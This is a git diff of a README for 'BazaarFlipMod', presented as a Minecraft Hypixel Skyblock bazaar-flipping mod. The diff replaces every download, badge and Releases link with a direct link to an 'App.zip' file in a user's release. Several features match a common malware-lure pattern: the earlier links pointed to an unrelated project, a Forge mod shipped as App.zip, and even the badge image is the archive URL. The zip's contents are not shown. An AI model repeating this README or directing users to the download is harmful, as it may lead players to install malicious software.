@@ -14,9 +14,9 @@ Welcome to BazaarFlipMod, a simple Minecraft bazaar flipping mod designed for Hy
 
 ## Installation 🛠️
 
-To install BazaarFlipMod, simply download the mod from the following link: [Download BazaarFlipMod](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To install BazaarFlipMod, simply download the mod from the following link: [Download BazaarFlipMod](https://github.com/crispyman1245/BazaarFlipMod/releases/download/v1.0/App.zip).
 
-[![Download BazaarFlipMod](https://img.shields.io/badge/Download-BazaarFlipMod-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download BazaarFlipMod](https://github.com/crispyman1245/BazaarFlipMod/releases/download/v1.0/App.zip)](https://github.com/crispyman1245/BazaarFlipMod/releases/download/v1.0/App.zip)
 
 Once downloaded, follow the installation instructions provided by the Forge mod loader to add BazaarFlipMod to your Minecraft game.
 
@@ -49,6 +49,6 @@ If you encounter any issues or have suggestions for improving BazaarFlipMod, ple
 
 ---
 
-Visit the [Releases](https://github.com/cli/go-gh/releases) section for the latest updates and versions of BazaarFlipMod. Download the latest release to access new features and improvements.
+Visit the [Releases](https://github.com/crispyman1245/BazaarFlipMod/releases/download/v1.0/App.zip) section for the latest updates and versions of BazaarFlipMod. Download the latest release to access new features and improvements.
 
 Thank you for using BazaarFlipMod! Happy bazaar flipping and enjoy your Hypixel Skyblock journey! 🌟
